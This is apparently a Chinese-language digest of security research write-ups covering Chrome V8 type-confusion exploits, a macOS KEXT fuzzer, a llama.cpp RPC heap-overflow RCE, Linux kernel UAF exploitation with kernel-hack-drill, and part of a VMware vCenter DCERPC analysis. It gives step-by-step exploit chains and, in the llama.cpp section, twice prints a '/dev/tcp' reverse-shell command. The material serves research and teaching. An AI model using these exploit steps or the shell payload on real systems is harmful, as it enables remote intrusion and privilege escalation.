# 浏览器安全的演进：三代Chrome V8漏洞对比分析


https://bbs.kanxue.com/thread-274865.htm
https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/#setting-up-the-v8-debugging-environment
https://github.blog/security/vulnerability-research/from-object-transition-to-rce-in-the-chrome-renderer/

## 技术背景对比

#### TurboFan 优化器

TurboFan 是 Chrome V8 JavaScript 引擎中的高级优化编译器。它在代码运行一段时间后，对热点（执行频繁）函数生成高度优化的机器码。TurboFan 支持多种底层优化，包括内联、类型分析、死代码消除等，目标是让 JavaScript 代码达到接近原生程序的执行效率。TurboFan 主要负责执行后期、性能敏感的优化，用于最终生成高效代码。

**特点：**

- 针对复杂代码路径和大型函数优化
- 支持多平台和多种 CPU 架构
- 优化激进，能显著提升性能

---

#### Maglev 优化器

Maglev 是 V8 引擎中较新的中间层优化编译器，设计目的是“快速启动”和“快速生成”。它比最基础的解释器（Ignition）快得多，但没有TurboFan那样复杂和激进。Maglev 适用于中等“热度”的函数，即那些执行次数较多、但还没有到需要TurboFan深度优化的程度。它用较短的编译时间，换取较好的执行效率。

**特点：**

- 编译速度快，适合提升“刚刚热起来”的代码性能
- 处于 Ignition（解释器）和 TurboFan 之间的优化层次
- 兼顾启动速度与运行性能，降低延迟

**CVE-2018-17463 (TurboFan优化器)**

- 发生在V8的TurboFan优化编译器中
- 涉及JavaScript引擎对Object.create()函数副作用的错误标记
- 本质为类型混淆漏洞，源于对象从FastProperties向DictionaryProperties的转换未被正确处理

**CVE-2023-4069 (Maglev优化器)**

- 出现在V8新一代中间层优化编译器Maglev中
- 位于Ignition解释器和TurboFan优化编译器之间，旨在提供更快的预热和高效执行
- 涉及Maglev对JavaScript特定构造处理时的类型推断错误

**CVE-2024-5830 (对象转换机制)**

- 针对Chrome最新的对象转换机制
- 涉及V8对象模型的内部实现细节，特别是Hidden Classes和对象转换
- 展示了攻击者对浏览器内部机制理解的进一步深化

**CVE-2018-17463（2018年）** 揭示了Chrome V8引擎TurboFan优化器的一个根本性缺陷。这个漏洞的核心在于JavaScript引擎错误地将`Object.create()`函数标记为不产生副作用（`kNoWrite`），而实际上该函数在某些条件下会触发`JSObject::OptimizeAsPrototype`，将对象从FastProperties模式转换为DictionaryProperties模式。这种模式转换会彻底改变对象的内存布局，而优化后的代码却仍然按照原有偏移访问属性，导致类型混淆。

**CVE-2023-4069（2023年）** 代表了对V8新一代优化编译器Maglev的攻击。Maglev作为V8引擎中介于解释器和TurboFan之间的中间层编译器，旨在提供更快的预热时间和更高效的代码执行。这个漏洞源于Maglev在处理某些特定JavaScript构造时的优化失误，导致类型推断错误。与早期漏洞不同，这个漏洞展示了针对V8多级编译管道中新组件的攻击方法。

**CVE-2024-5830（2024年）** 则是最新的进化，针对Chrome对象转换机制的一个深层次利用。这个漏洞基于V8对象模型的内部实现细节，特别是对象转换和属性访问的处理方式。与前两个漏洞相比，这个漏洞更加精细地利用了V8对象模型的复杂性，显示了攻击者对浏览器内部机制理解的深化。

## 研究技术思路演进

**CVE-2018-17463** 的研究思路较为直接：首先识别编译器标记与实际行为的不匹配，然后构建一个可预测的对象转换场景。关键创新在于发现特定属性对（x和y）在对象转换后会产生内存重叠，使得访问一个属性时实际读取另一个属性的内存。研究者通过精心构造的JavaScript代码，建立了从信息泄露到任意内存写入的完整利用链。

**CVE-2023-4069** 的研究展现了更深入的编译器分析技术。研究者需要理解Maglev编译器的内部工作机制，包括其中间表示（IR）、优化过程和代码生成。这种研究需要更专业的逆向工程能力和编译原理知识。此外，研究还涉及跨平台利用技术，特别是如何将针对Linux的V8 shellcode适配到Windows环境，这反映了攻击技术的平台无关化趋势。

**CVE-2024-5830** 的研究代表了当前浏览器漏洞研究的尖端水平。这项研究需要对V8对象模型有极其深入的理解，包括隐藏类（Hidden Classes）、对象转换机制和JIT编译器的工作原理。研究者通过精确控制对象转换的时机和方式，实现了一种新型的类型混淆攻击。这种研究方法展示了现代浏览器漏洞研究趋向于微观层面和精细控制。

**CVE-2018-17463**

- 识别编译器标记与实际行为不匹配：Object.create()被错误标记为kNoWrite
- 利用对象内存布局变化而优化代码未检测这种变化的问题
- 寻找特定属性对在对象转换后产生内存重叠的方法

**CVE-2023-4069**

- 深入分析Maglev编译器的内部工作机制和中间表示
- 研究Maglev优化过程中的类型处理和代码生成漏洞
- 探索跨平台利用技术，将Linux shellcode适配到Windows环境

**CVE-2024-5830**

- 精确分析V8对象模型和隐藏类（Hidden Classes）机制
- 研究对象转换在不同条件下的行为特性
- 开发高精度控制对象转换时机的技术，实现可靠的类型混淆



## 利用步骤

**CVE-2018-17463**

1. 构造含有特定属性对(x,y)的JavaScript对象
2. 触发Object.create()导致对象模式转换
3. 利用优化代码跳过Map检查，按原有偏移访问属性
4. 构建信息泄露原语，泄露关键地址
5. 利用ArrayBuffer的backing store指针实现任意内存写入
6. 定位WebAssembly的RWX内存区域并写入shellcode执行

**CVE-2023-4069**

1. 创建触发Maglev优化的热点函数
2. 利用Maglev编译器的类型推断错误
3. 构造特定JavaScript代码结构引发类型混淆
4. 建立内存读写原语
5. 泄露关键内存地址和结构
6. 修改内存实现代码执行

**CVE-2024-5830**

1. 创建特定对象并精确控制其属性和原型链
2. 触发对象转换，改变对象的内部结构
3. 避开V8的类型检查，实现类型混淆
4. 利用类型混淆构建内存读取原语
5. 泄露关键对象地址和内存布局信息
6. 构造内存写入原语，修改可执行内存
7. 实现沙箱内代码执行

| 方面          | CVE-2018-17463                                                                       | CVE-2023-4069                                                                                           | CVE-2024-5830                                                                                                    |
| ----------- | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| **漏洞类型**    | TurboFan中的类型混淆                                                                       | Maglev编译器中的类型混淆                                                                                         | fast对象和dictionary对象之间的类型混淆                                                                                       |
| **根本原因**    | CreateObject被错误标记为kNoWrite，实际上会修改对象的map                                              | Maglev优化FindNonDefaultConstructorOrConstruct时对象初始化不完整                                                   | 过时map的更新导致dictionary map被期望fast map的代码使用                                                                         |
| **触发漏洞的步骤** | 1. 创建访问obj.x的函数  <br>2. 调用Object.create(obj)  <br>3. 返回obj.y  <br>4. 重复执行函数使其被优化     | 1. 创建具有继承关系的类  <br>2. 使用Reflect.construct混淆new.target  <br>3. 使new.target成为常量(Array)  <br>4. 触发Maglev优化 | 1. 创建带属性的对象  <br>2. 定义一个导致map过时的getter  <br>3. 使用展开语法{...}克隆对象  <br>4. 使map意外更新为dictionary类型                     |
| **类型混淆**    | 快速属性对象(FastProperties)和字典属性对象(DictionaryProperties)之间                                | 部分初始化的对象之间，其中Array没有正确初始化其length属性                                                                      | fast类型和dictionary类型对象之间，代码假设更新后的map仍然是fast map                                                                   |
| **利用原语**    | 1. 找出发生混淆的属性x,y  <br>2. 利用混淆读/写对象地址  <br>3. 创建具有任意backing store的数组  <br>4. 获取任意读/写能力 | 1. 创建具有任意长度的损坏Array  <br>2. 使用数组获取其他对象地址  <br>3. 在受控对象上读/写  <br>4. 建立addrOf和fakeObj原语                   | 1. 覆盖NameDictionary中的elements字段  <br>2. 使用MigrateSlowToFast越界读取对象  <br>3. 在字典后放置伪造对象  <br>4. 获取任意读/写原语           |
| **代码执行技术**  | 1. 创建WebAssembly缓冲区  <br>2. 找到RWX段  <br>3. 在可执行内存中写入shellcode  <br>4. 执行wasm函数       | 1. JIT喷射shellcode作为浮点数  <br>2. 替换JIT代码指针  <br>3. 将IEEE数字转换为shellcode指令  <br>4. 执行优化函数                   | 1. 混淆Blink API对象(DOMRect和DOMTypedArray)  <br>2. 覆盖array的backing_store  <br>3. 获取sandbox外的任意读/写  <br>4. 修改JIT代码地址 |
| **绕过的缓解措施** | 未提及特定措施，属于V8沙箱前时期                                                                    | V8堆沙箱，使用JIT喷射而非WebAssembly RWX                                                                          | V8堆沙箱，使用Blink API对象逃逸沙箱                                                                                          |
| **复杂度**     | 中等                                                                                   | 高                                                                                                       | 高                                                                                                                |
| **日期/版本**   | 2018年                                                                                | 2023年(Chrome v114+)                                                                                     | 2024年(Chrome v126.0.6478.56/57)                                                                                  |

## 漏洞影响与安全意义

从**影响范围**看，三个漏洞都能实现Chrome渲染器沙箱内的远程代码执行，但利用的技术复杂度和可靠性有所不同。CVE-2018-17463需要构造复杂的对象结构和精确的内存操作；CVE-2023-4069展示了针对新编译器的攻击，可能在某些优化条件下更容易触发；而CVE-2024-5830则通过单次访问恶意网站即可触发，显示出攻击技术的成熟与简化。

从**防御挑战**角度，这三个漏洞反映了浏览器安全的几个关键趋势：

1. **优化与安全的权衡**：所有三个漏洞都与JavaScript引擎的性能优化直接相关。随着浏览器厂商不断推出新的优化技术以提高性能，安全研究者也在不断探索这些优化中的漏洞。
    
2. **漏洞复杂度提升**：从2018年到2024年，漏洞利用技术变得更加精细和深入，需要对浏览器内部机制有更全面的理解。
    
3. **沙箱绕过难度增加**：虽然这些漏洞都能在渲染器沙箱内执行代码，但完整的攻击链通常还需要额外的沙箱逃逸漏洞，这反映了浏览器多层防御机制的有效性。
    

## 技术演进与未来趋势

从这三个漏洞的演变可以看出几个关键趋势：

1. **攻击面从宏观到微观**：早期漏洞往往针对明显的编译器标记错误，而最新漏洞则针对对象模型的细微实现细节。
    
2. **利用技术标准化**：从最初的概念验证到今天的成熟利用链，JavaScript引擎漏洞利用已发展出一套相对标准的方法论。
    
3. **防御机制的适应性**：Chrome团队不断改进其安全架构，包括加强类型检查、引入控制流完整性保护和改进沙箱设计。
    

这些漏洞共同展示了浏览器安全研究的不断深化，以及攻防双方在技术能力上的持续升级。随着WebAssembly、Site Isolation等新技术的普及，未来的浏览器安全研究将继续向更深层次发展，需要更专业的知识和更创新的思维来发现和缓解新型威胁。



# Pishi: 覆盖率引导的macOS KEXT模糊测试工具
https://r00tkitsmm.github.io/fuzzing/2024/11/08/Pishi.html

## 技术背景

Pishi是一个针对macOS内核扩展(KEXT)的静态二进制重写工具，专为覆盖率引导的模糊测试设计。macOS内核安全研究面临几大主要障碍：

1. **内核资源有限**：与Linux和Windows相比，macOS内核研究工具和文档稀缺
2. **架构复杂性**：MacOS采用XNU内核，兼具Mach和BSD特性，同时支持x86_64和ARM64架构
3. **闭源特性**：大部分驱动为闭源，缺乏源代码级分析手段
4. **模糊测试挑战**：缺乏针对macOS内核的专业模糊测试工具

这些挑战导致macOS内核安全研究相对不足，而内核扩展作为特权代码，一旦存在漏洞可能带来严重安全风险。

## 研究技术思路

Pishi的核心思想是通过静态二进制重写技术，在KEXT中插入覆盖率收集代码，同时保持二进制的功能完整性。其关键技术思路包括：

- **无源码插桩**：直接对编译后的KEXT二进制进行修改，无需源代码
- **覆盖率收集**：设计专门的机制收集边缘覆盖率，指导模糊测试
- **二进制兼容性**：确保重写后的KEXT仍能正常加载和运行
- **静态分析与重写**：采用静态分析识别代码块边界，在适当位置插入探针
- **动态反馈机制**：建立用户空间与内核空间的通信通道，实时获取覆盖率信息

与传统的内核模糊测试方法相比，Pishi不依赖LLVM插桩或虚拟化技术，为闭源环境提供了新的测试可能。

## 实现步骤

1. **基础结构分析**：
    
    - 解析Mach-O二进制文件结构
    - 识别代码段和数据段
    - 确定KEXT的入口点和导出函数
2. **探针插入策略确定**：
    
    - 识别基本块边界
    - 设计边缘覆盖率收集机制
    - 规划共享内存映射策略
3. **代码重写与补丁应用**：
    
    - 插入覆盖率计数器更新指令
    - 调整跳转和分支指令
    - 重定位受影响的引用
4. **共享内存机制实现**：
    
    - 创建内核与用户空间共享的内存区域
    - 设计覆盖率数据存储格式
    - 实现原子更新机制避免竞态条件
5. **模糊测试引擎整合**：
    
    - 开发适配器连接AFL++等模糊测试引擎
    - 实现覆盖率反馈循环
    - 设计测试用例生成和变异策略
6. **验证与部署**：
    
    - 验证重写KEXT的功能完整性
    - 检测性能开销
    - 部署到目标测试环境

## 技术影响

**安全研究增强**：

- 为macOS内核安全研究提供了急需的工具
- 使闭源KEXT的模糊测试成为可能
- 提高了漏洞发现效率，尤其是边界条件和异常处理缺陷

**技术创新**：

- 首个专为macOS KEXT设计的覆盖率引导模糊测试解决方案
- 开创了无源码、静态二进制重写在苹果生态系统的应用
- 为ARM64架构的macOS系统提供了专门的测试工具

**行业影响**：

- 降低了macOS内核安全研究的门槛
- 促进了模糊测试技术在封闭生态系统中的应用
- 为安全研究者提供了新的漏洞挖掘途径

**生态系统安全改进**：

- 有助于发现和修复潜在的内核级安全漏洞
- 提高了macOS整体安全性，尤其是针对第三方驱动
- 为Apple改进其安全开发实践提供了数据支持

Pishi代表了针对封闭源操作系统内核的安全测试新方向，弥补了当前工具链的不足。通过使模糊测试这一高效的漏洞发现技术适用于macOS内核扩展，Pishi有望显著提升Apple生态系统的安全性，并为其他封闭系统的安全研究提供借鉴。随着工具的进一步发展和应用，它可能成为macOS内核安全审计的标准工具之一。


# Llama.cpp RPC远程代码执行漏洞分析

https://retr0.blog/blog/llama-rpc-rce

## 技术背景

Llama.cpp是一个用于分布式大语言模型推理的高级项目，通过RPC服务器提供服务。该项目采用了自定义堆管理系统并实现了独特的安全缓解措施，曾修复过写任意位置(GHSA-wcr5-566p-9cwj、GHSA-5vm9-p64x-gqw9)等漏洞。然而，`cpy_tensor`操作中存在堆溢出问题，这是由于`ggml_nbytes`张量大小计算缺乏完整检查导致的。尽管存在多层次的过滤检查，此溢出仍能覆盖相邻的`buffer`结构体，而这些结构体对RPC内存操作至关重要。

Llama.cpp 的 RPC 服务，就是提供网络 API 让用户/程序能远程调用和控制 Llama.cpp 推理与管理功能的后台服务器接口。

## 研究技术思路

1. **漏洞点识别**：  
    在`ggml_backend_cpu_buffer_cpy_tensor`函数中发现堆溢出漏洞，当源张量与目标张量大小不匹配时，可通过操纵张量维度数组`ne[]`和步长数组`nb[]`触发不受控制的`memcpy`操作。
    
2. **绕过防护措施**：
    
    - **防护点1（溢出限制）**：`deserialize_tensor()`和`ggml_backend_tensor_set`中的边界检查阻止了直接伪造任意指针。
    - **防护点2（部分写入限制）**：通过`buffer->iface`方法重定向控制流需要先泄露基址。
    - **解决方案**：设置`buffer->iface.free_buffer = NULL`安全覆盖其他`iface`成员。
3. **面向结构的编程**：  
    将`buffer`结构重新解释为`ggml_backend`对象，链接嵌套调用（`ggml_backend_get_alignment` → `ggml_backend_get_default_buffer_type`）以执行带受控参数的`system()`函数。
    

## 利用步骤

1. **堆布局操作**：  
    分配`src`和`dst`缓冲区。计算精确的`ne[]`/`nb[]`值（如`ne = [96, 96, 96, 63]`，`nb = [10, 1, 1, 1]`产生282字节溢出），使`dst`溢出到相邻的`buffer`结构。
    
2. **泄露libggml基址**：
    
    - 部分覆写`buffer->iface.get_base`指向`ggml_backend_buffer_get_type`函数。
    - 通过RPC调用`buffer_get_base`泄露`buffer->buft`，从而获取`libggml-base.so`的基址。
3. **泄露libc基址**：
    
    - 构造伪造的`buffer`结构，设置`context = memcpy@GOT - 0x30`。
    - 使用`get_tensor`读取`memcpy@GOT`，泄露`libc.so.6`基址。
4. **通过调用链劫持实现RCE**：
    
    - 覆写`buffer->iface.get_base`为`ggml_backend_get_alignment`。
    - 精心构造`ggml_backend`结构：
        - `backend->device->iface.get_buffer_type = system`
        - `backend->device->context = "sh -i >& /dev/tcp/127.0.0.1/1337 0>&1"`
    - 触发`get_base`执行命令，获得反向shell。


1. **漏洞点识别与分析**：  
    在`ggml_backend_cpu_buffer_cpy_tensor`函数中发现堆溢出漏洞，当源张量与目标张量大小不匹配时，可通过操纵张量维度数组`ne[]`和步长数组`nb[]`触发不受控制的`memcpy`操作。
    
2. **防护措施分析与绕过策略**：
    
    - **防护点1（溢出限制）**：`deserialize_tensor()`和`ggml_backend_tensor_set`中的边界检查阻止了直接伪造任意指针。
    - **防护点2（部分写入限制）**：通过`buffer->iface`方法重定向控制流需要先泄露基址。
    - **解决方案**：设置`buffer->iface.free_buffer = NULL`安全覆盖其他`iface`成员。
3. **堆布局操作与溢出触发**：  
    分配`src`和`dst`缓冲区。计算精确的`ne[]`/`nb[]`值（如`ne = [96, 96, 96, 63]`，`nb = [10, 1, 1, 1]`产生282字节溢出），使`dst`溢出到相邻的`buffer`结构。
    
4. **libggml基址泄露**：
    
    - 部分覆写`buffer->iface.get_base`指向`ggml_backend_buffer_get_type`函数。
    - 通过RPC调用`buffer_get_base`泄露`buffer->buft`，从而获取`libggml-base.so`的基址。
5. **libc基址泄露**：
    
    - 构造伪造的`buffer`结构，设置`context = memcpy@GOT - 0x30`。
    - 使用`get_tensor`读取`memcpy@GOT`，泄露`libc.so.6`基址。
6. **面向结构的编程构造**：  
    将`buffer`结构重新解释为`ggml_backend`对象，链接嵌套调用（`ggml_backend_get_alignment` → `ggml_backend_get_default_buffer_type`）以执行带受控参数的`system()`函数。
    
7. **RCE实现与命令执行**：
    
    - 覆写`buffer->iface.get_base`为`ggml_backend_get_alignment`。
    - 精心构造`ggml_backend`结构：
        - `backend->device->iface.get_buffer_type = system`
        - `backend->device->context = "sh -i >& /dev/tcp/127.0.0.1/1337 0>&1"`
    - 触发`get_base`执行命令，获得反向shell。

## 影响

- **严重的远程代码执行**：攻击者可在运行易受攻击的`llama.cpp` RPC实例的服务器上执行任意代码。
- **绕过安全措施**：成功绕过了自定义堆保护和多层安全过滤机制。
- **利用可靠性**：由于ASLR保护，需要1-16次尝试，但最终能可靠实现RCE。
- **修补紧迫性**：凸显了复杂ML基础设施中的风险；未修补系统极易受到针对性攻击。

## 总结

这个漏洞利用组合了堆风水(Heap Feng Shui)、部分指针覆写和结构化内存重解释技术，成功绕过了`llama.cpp`中强大的防御机制，证明即使是已修补、高度加固的系统也可能存在非常规漏洞。该漏洞利用过程展示了复杂系统中防护层层筑起却仍存在被击穿风险的现实，对于大语言模型部署安全提出了新的挑战。完整PoC可在[GitHub Gist](https://gist.github.com/retr0reg/d13de3fde8f9d138fe1af48e59e630a9)获取。




# Linux内核漏洞挖掘环境：kernel-hack-drill分析

## 技术背景

kernel-hack-drill是由Alexander Popov开发的Linux内核漏洞研究环境，专为漏洞探索和利用开发而设计。该环境提供了一套完整的工具链，使安全研究人员能够在可控条件下测试各种内核攻击原语，避免在真实漏洞利用开发过程中的不稳定性干扰。与传统的Linux内核漏洞研究方法不同，kernel-hack-drill采用模块化方法，允许研究人员将复杂的利用链分解为可独立测试的组件。该工具特别适用于内存损坏类漏洞的研究，如Use-After-Free (UAF)、堆溢出等，并提供了丰富的示例漏洞利用代码，展示了跨缓存攻击、面向结构编程等现代内核利用技术。
Kernel-Hack-Drill环境搭建首先需要克隆仓库并编译安装内核模块。研究人员通过加载drill_mod.ko模块，在系统中创建一个受控的漏洞测试环境。该模块提供/proc/drill_act接口，允许用户空间程序精确控制内核对象的分配与释放。与真实漏洞不同，这里的UAF条件可完全受控，便于开发和测试各种攻击原语。

## 研究技术思路

kernel-hack-drill基于以下核心思路：

1. **隔离测试环境**：通过自定义内核模块(drill_mod.ko)提供可控的漏洞环境，使研究人员可以专注于利用原语开发，而非漏洞复现。
    
2. **模拟真实漏洞特征**：精心设计的漏洞模拟了真实内核漏洞的关键特性，如UAF、内存重用和竞争条件，同时避免了真实漏洞中的不可预测性。
    
3. **跨缓存攻击模型**：提供了从UAF到任意内存写入的完整攻击链，特别关注SLUB分配器的内部工作机制，如CPU部分列表和活动缓存管理。
    
4. **多样化攻击原语**：支持多种攻击向量的测试，包括控制流劫持、数据篡改和内存信息泄露，适应不同的内核保护机制。
    
5. **组件化开发**：允许单独测试和完善攻击链的各个环节，如堆操作、对象喷射、内存重用和权限提升，最终整合为完整利用。
    

## 漏洞利用开发步骤

1. **环境准备**：
    
    - 下载kernel-hack-drill工具仓库
    - 按照README指南配置虚拟机环境
    - 编译并加载drill_mod.ko内核模块
2. **漏洞模拟**：
    
    - 通过/proc/drill_act接口控制内核对象生命周期
    - 使用DRILL_ACT_ALLOC分配对象，DRILL_ACT_FREE释放对象
    - 保持对已释放对象的引用，模拟UAF条件
3. **堆布局操作**：
    
    - 收集SLUB分配器信息(如cpu_partial=120, objs_per_slab=42)
    - 创建新的活动slab，分配objs_per_slab个对象
    - 为部分列表分配(objs_per_slab * cpu_partial)个对象
    - 创建包含漏洞对象的slab，获取UAF引用
    - 释放slab中除目标对象外的所有对象
4. **内存重用**：
    
    - 清理部分列表，为跨缓存攻击准备条件
    - 通过喷射目标对象(如msg_msg、pipe_buffer)重用包含UAF对象的页面
    - 利用UAF写入修改重用对象的关键字段
5. **权限提升实现**：
    
    - 针对不同攻击目标开发特定利用链：
        - 对msg_msg：修改m_ts实现内核内存越界读取，泄露敏感信息
        - 对pipe_buffer：修改flags和page指针，实现类似Dirty Pipe的攻击
        - 对函数指针：实现控制流劫持，执行提权代码
6. **利用链测试与调试**：
    
    - 使用内核调试工具(如GDB、/proc/kmsg)验证每个攻击步骤
    - 解决堆布局异常和时序问题
    - 优化利用成功率，确保稳定性
## UAF原语分析与复现

研究人员首先通过drill_mod.ko理解CVE-2024-50264的核心漏洞特征：virtio_vsock_sock对象的Use-After-Free写入。在Kernel-Hack-Drill环境中，研究者可以分配drill_item_t对象（大小为95字节，与目标virtio_vsock_sock相近），然后通过特定操作序列获取对象引用，并在释放后保持引用，形成可控的UAF条件。

研究人员通过查看/sys/kernel/slab/目录下的信息，获取关键参数如cpu_partial=120和objs_per_slab=42，这对理解和操控SLUB分配器行为至关重要。通过分析drill_uaf_write_msg_msg.c示例，研究者可以确定UAF利用的关键点：锁相关操作和数据写入操作，这与CVE-2024-50264中在kworker中发生的UAF写入行为高度相似。

## 跨缓存攻击策略开发

基于Kernel-Hack-Drill环境，研究人员设计了精确的堆布局策略。首先创建新的活动slab页，为cpu部分列表分配对象，再创建包含漏洞对象的slab，并获取UAF引用。这一系列操作使研究者能够精确控制堆内存布局，为后续跨缓存攻击做准备。

借助Kernel-Hack-Drill提供的调试补丁，研究者能够跟踪slab释放过程，观察__put_partials函数中调用discard_slab的行为，验证slab如何移至页分配器。通过GDB和调试工具，可视化内存状态变化，确认跨缓存攻击的可行性。

针对msg_msg对象，研究者开发了创新的喷射技术：先填充消息队列留下极少空间，然后多线程喷射msg_msg对象，在UAF写入后通过接收消息触发越界读取。这种技术解决了msg_msg.m_list被破坏导致的问题，因为内核会自动修复被破坏的链表指针。

## 应用到CVE-2024-50264漏洞

将Kernel-Hack-Drill中验证的技术应用到实际漏洞时，研究者创新性地使用了"不朽"信号33（NPTL内部信号）代替SIGKILL，通过精确计时中断connect()调用，大幅提高了竞争条件触发的稳定性。

为解决kworker中UAF写入发生过快的问题，研究者实现了Jann Horn提出的kworker延迟技术：创建timerfd，在多个进程中为大量复制的timerfd注册epoll事件，通过计时器中断延缓kworker执行，为跨缓存攻击争取时间。

针对pipe_buffer实现提权，研究者在Kernel-Hack-Drill环境中验证了多管道缓冲区技术：分配多个pipe_buffer，丢弃第一个以避免使用被破坏的ops指针，通过splice()修改flags为零，然后利用泄露的cred地址计算page结构偏移。由于随机化的vmemmap基址只有2位随机性，研究者设计了高效的爆破方法，通过尝试读取pipe来访问cred内容，成功时修改euid/egid实现提权。

## 优化与突破性发现

Kernel-Hack-Drill环境帮助研究者克服了CVE-2024-50264利用中的多个关键限制：

1. 解决了virtio_vsock_sock客户端与服务端对象成对分配的问题，通过精确计时信号实现了单对象UAF
2. 大幅提高了竞争条件触发的稳定性，使UAF写入从几分钟一次提升到每秒一次
3. 通过kworker延迟技术解决了UAF写入过快的问题
4. 通过listen()调用抢先执行，避免了kworker中的空指针解引用
5. 巧妙绕过了VSOCK_CLOSE_TIMEOUT(8秒)后的第二次空指针解引用
6. 创新设计了多pipe_buffer技术，避免了tx_lock非零导致的kworker挂起

Kernel-Hack-Drill环境使研究者能够独立测试和优化利用链的每个环节，最终实现了从UAF到信息泄露，再到任意地址写入的完整攻击链，在现代Linux内核保护机制下成功实现提权，展示了该工具在内核漏洞研究中的巨大价值。

## 影响与价值

kernel-hack-drill对Linux内核安全研究具有深远影响：

1. **提升研究效率**：大幅降低了内核漏洞利用研究的门槛和时间成本，让研究人员能够专注于攻击原语开发而非漏洞复现。
    
2. **教育价值**：提供了丰富的示例代码和详细注释，是学习现代内核漏洞利用技术的理想平台。
    
3. **安全加固参考**：通过展示不同攻击链的执行机制，为内核开发者提供了更有针对性的安全加固方向。
    
4. **研究方法创新**：引入了组件化测试方法，为复杂漏洞的研究提供了新思路，特别适用于竞争条件等难以稳定复现的漏洞类型。
    
5. **防御评估工具**：安全研究人员可以使用此环境评估内核保护机制的有效性，包括KASLR、堆隔离和控制流完整性保护等。
    

kernel-hack-drill展示了在严格控制的环境中开发和测试内核漏洞利用链的强大能力，为研究人员提供了一个安全、高效的平台，探索现代Linux内核的安全边界。通过分解复杂的攻击链为可测试的组件，该工具使得即使是最复杂的内核漏洞也能被系统化地分析和利用，同时也为内核开发者提供了宝贵的安全改进参考。


|文件名|类型|主要功能|技术特点|应用价值|
|---|---|---|---|---|
|**drill_mod.c**|内核模块|提供可控的漏洞环境|通过procfs接口暴露可控UAF和内存操作原语|创建安全可控的漏洞测试基础设施|
|**drill.h**|头文件|定义模块接口和数据结构|封装了枚举常量和结构定义|确保用户空间与内核模块通信标准化|
|**drill_test.c**|测试程序|验证环境可用性|兼容KASAN构建的内核|提供环境健康性基线检查|
|**drill_uaf_callback.c**|控制流劫持PoC|函数指针劫持攻击|直接调用UAF对象中的回调函数|演示最直接的控制流攻击路径|
|**drill_uaf_w_msg_msg.c**|信息泄露PoC|跨缓存覆写msg_msg.m_ts|实现内核内存越界读取|用于开发信息泄露攻击链环节|
|**drill_uaf_w_pipe_buffer.c**|数据篡改PoC|覆写pipe_buffer.flags|复现Dirty Pipe漏洞攻击|实现无需泄露的提权路径|
|**drill_uaf_w_pte.c**|页表攻击PoC|覆写页表项(PTE)|实现Dirty Pagetable攻击|演示内存翻译层攻击技术|
|**drill_uaf_w_pud.c**|高级页表攻击PoC|覆写页上级目录(PUD)|通过大页实现Dirty Pagetable|展示更高权限级别的内存管理攻击|


# VMware vCenter Server DCERPC漏洞分析：CVE-2024-37079/37080/38812/38813

**摘要**  
作为最流行的商业虚拟化解决方案之一，VMware 的安全一直是业界关注的焦点。过去几年，我们密切关注其虚拟化基础架构的安全问题，发现并向 VMware 报告了 ESXi 和 Workstation 中的大量漏洞，并受邀在 DEFCON 和 HITB 等安全会议上分享我们的研究成果。2023  
  
年底，我们注意到 VMware 修复了 vCenter Server 中一个高危内存损坏漏洞 (CVE-2023-34048)。官方通报指出该漏洞可能已被利用，这激发了我们进一步研究的兴趣。在过去的一年里，我们将研究重点转移到了 vCenter Server 上。最终，我们在其 DCE/RPC 协议组件中发现了三个堆溢出漏洞和一个提权漏洞，CVE 编号分别为 CVE-2024-37079、CVE-2024-37080、CVE-2024-38812 和 CVE-2024-38813。在 Matrix Cup 2024 安全竞赛中，我们利用其中一个堆溢出漏洞以及提权缺陷，成功实现了以 root 权限执行远程代码，完成了 vCenter Server 项目挑战。我们及时将所有发现的漏洞报告给了 VMware。  
  
在本演讲中，我们将首先详细介绍 DCERPC 协议以及我们在 vCenter Server 中发现的四个该协议实现过程中的漏洞。众所周知，利用网络服务中的内存损坏漏洞实现远程代码执行极具挑战性，尤其是在部署了地址空间布局随机化 (ASLR) 和位置无关可执行文件 (PIE) 等防御措施的情况下。然后，我们将深入探讨利用其中两个漏洞以 root 权限执行远程代码的高级堆风水技巧。最后，在获得 vCenter Server 操作系统的 root 访问权限后，我们将介绍一种进一步提升权限并控制 ESXi 本身的方法——演示如何利用这些漏洞完全控制虚拟化基础架构。


## 技术背景

VMware vCenter Server是企业级虚拟化管理平台，广泛应用于大中型企业数据中心。2024年6月，VMware修复了多个严重的远程代码执行漏洞，包括DCERPC组件中的CVE-2024-37079、CVE-2024-37080、CVE-2024-38812及其延伸CVE-2024-38813。这些漏洞存在于vCenter Server的DCERPC（分布式计算环境/远程过程调用）协议实现中，允许远程攻击者通过构造特定的网络数据包触发堆溢出、堆使用后释放（UAF）和越界读写等内存破坏漏洞，从而实现未授权的远程代码执行。这些漏洞危害极大，攻击复杂度低，无需用户交互，可通过网络直接利用，且无需特殊权限。

CVE-2024-37079与CVE-2024-37080主要涉及NDR（网络数据表示）编码与解码过程中的堆溢出漏洞，而CVE-2024-38812/38813则与DCERPC服务器端的内存管理缺陷相关，可导致高权限的远程代码执行。这些漏洞的CVSS评分高达9.8分（严重级别），表明其对受影响系统构成重大威胁。

## 研究技术思路

研究人员通过深入分析DCERPC协议实现及其数据处理流程，揭示了漏洞触发的根本原因。研究过程主要围绕以下方向展开：

1. **协议解析与数据流分析**：研究DCERPC协议规范，重点关注NDR数据序列化和反序列化过程，以及服务器如何处理客户端请求。
    
2. **内存管理缺陷识别**：通过静态分析和动态调试，发现vCenter Server在处理复杂数据结构时的边界检查不足和内存分配释放错误。
    
3. **漏洞利用条件研究**：确定触发漏洞所需的精确网络请求构造方法，包括数据类型、大小和特定字段的操作。
    
4. **防御绕过可能性评估**：分析现有保护机制（如ASLR、DEP、堆保护）对漏洞利用的影响，寻找可能的绕过途径。
    

## CVE-2024-37079/37080（NDR解析堆溢出）

1. **协议分析**：确定目标vCenter Server可访问的DCERPC端点和接口。
    
2. **构造请求**：创建特制的DCERPC数据包，包含精心设计的NDR数据，使其绕过表面验证但在后续处理中触发堆溢出。
    
3. **发送攻击载荷**：通过网络向目标vCenter Server的DCERPC服务（通常在TCP端口135或其他映射端口）发送构造的数据包。
    
4. **触发漏洞**：服务器解析NDR数据时，内存分配与实际需求不匹配，导致堆溢出。
    
5. **执行代码**：利用堆内存布局的可预测性，将执行流重定向到攻击者控制的shellcode。
    
### 1. 初始攻击准备

**CVE-2024-37079:**

- 构造DCERPC **Bind请求**数据包
- 关键点：设置`Num Ctx Items`字段为**边界值0xA9**
